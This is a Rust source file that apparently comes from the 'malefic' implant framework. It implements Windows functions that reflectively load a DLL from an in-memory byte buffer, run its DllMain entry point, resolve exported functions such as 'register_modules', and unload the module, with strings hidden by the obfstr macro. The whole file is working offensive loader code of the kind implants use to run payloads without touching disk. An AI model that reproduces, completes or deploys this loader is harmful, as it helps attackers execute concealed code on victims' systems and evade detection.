use core::{ffi::c_void, ptr::{null, null_mut}};
use obfstr::obfstr;

use crate::{
    debug,
    CommonError::{self, ArgsError},
};


#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub unsafe fn get_function_address(module_base: *const c_void, function_name: &str) -> *const c_void {
    use crate::win::kit::MaleficGetFuncAddrWithModuleBaseDefault;

    MaleficGetFuncAddrWithModuleBaseDefault(
        module_base,
        function_name.as_ptr(),
        function_name.len(),
    )
}

#[cfg(target_os = "windows")]
#[cfg(feature = "source")]
pub unsafe fn get_function_address(module_base: *const c_void, function_name: &str) -> *const c_void {
    use malefic_win_kit::dynamic::DynamicLibraryUtils::GetFuncAddrWithModuleBaseDefault;
    GetFuncAddrWithModuleBaseDefault(module_base, function_name.as_bytes())
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {
    use crate::win::kit::{PELoader, MaleficModule};

    if bins.is_empty() || bundle.is_empty() {
        return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
    }
    debug!("[+] load module {}, len: {}", bundle, bins.len());
    
    let dark_module = PELoader(
        null(),
        bins.as_ptr() as *const c_void,
        bins.len(),
        false, // need_modify_magic
        false, // need_modify_sign
        0,
        0
    ) as *const c_void;
    if dark_module.is_null() {
        return Err(ArgsError("dark module load failed!".to_string()));
    }
    let module_base = (*(dark_module as *const MaleficModule)).new_module;
    let entry_point = (*(dark_module as *const MaleficModule)).entry_point;
    if module_base.is_null() || entry_point.is_null() {
        return Err(ArgsError("dark module module base / entry point is null!".to_string()));
    }
    let _ = core::mem::transmute::<usize, crate::win::types::DllMain>(entry_point as usize)(
        module_base as _,
        1, // DLL_PROCESS_ATTACH
        null_mut(),
    );

    Ok(dark_module)
}

#[cfg(target_os = "windows")]
#[cfg(feature = "source")]
pub unsafe fn load_module(
    bins: Vec<u8>,
    bundle: String,
) -> Result<*const malefic_win_kit::pe::PELoader::MaleficModule, CommonError> {
    use malefic_win_kit::pe::PELoader::malefic_loader;

    use crate::{common::utils::pointer_add, win::types::DllMain};

    if bins.is_empty() || bundle.is_empty() {
        return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
    }
    debug!("[+] loading module: {} {}", bundle, bins.len());
    // let new_bundle = format!("{}{}", bundle, "\x00");
    let dark_module = malefic_loader(
        null(),
        bins.as_ptr() as _,
        bins.len(),
        &None,
        &None,
    );
    if dark_module.is_null() || (*dark_module).entry_point.is_null() {
        return Err(ArgsError("dark module load failed!".to_string()));
    }
    let _ = core::mem::transmute::<usize, DllMain>((*dark_module).entry_point as usize)(
        dark_module as _,
        1, // DLL_PROCESS_ATTACH
        null_mut(),
    );
    Ok(dark_module)
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub unsafe fn unload_pe(module: *const c_void) {
    use crate::win::kit::UnloadPE;

    if module.is_null() {
        return;
    }
    UnloadPE(module);
}

#[cfg(target_os = "windows")]
#[cfg(feature = "source")]
pub unsafe fn unload_pe(
    module: *const core::ffi::c_void,
) {
    use malefic_win_kit::pe::PELoader::unload_pe;

    if module.is_null() {
        return;
    }
    unload_pe(module as _);
}


#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
    use crate::win::kit::DarkModule;
    let module: *const DarkModule = module as _;
    if module.is_null() {
        return None;
    }

    Some(get_function_address((*module).module_base, "register_modules"))
}

#[cfg(target_os = "windows")]
#[cfg(feature = "source")]
pub unsafe fn call_fresh_modules(
    module: *const malefic_win_kit::pe::PELoader::MaleficModule,
) -> Option<*const c_void> {
    if module.is_null() {
        return None;
    }

    Some(get_function_address((*module).new_module, "register_modules"))
}

#[cfg(target_family = "unix")]
pub unsafe fn load_module(_bins: Vec<u8>, _bundle: String) -> Result<*const c_void, CommonError> {
    todo!()
}

#[cfg(target_family = "unix")]
pub unsafe fn call_fresh_modules(_module: *const c_void) -> Option<*const c_void> {
    todo!()
}
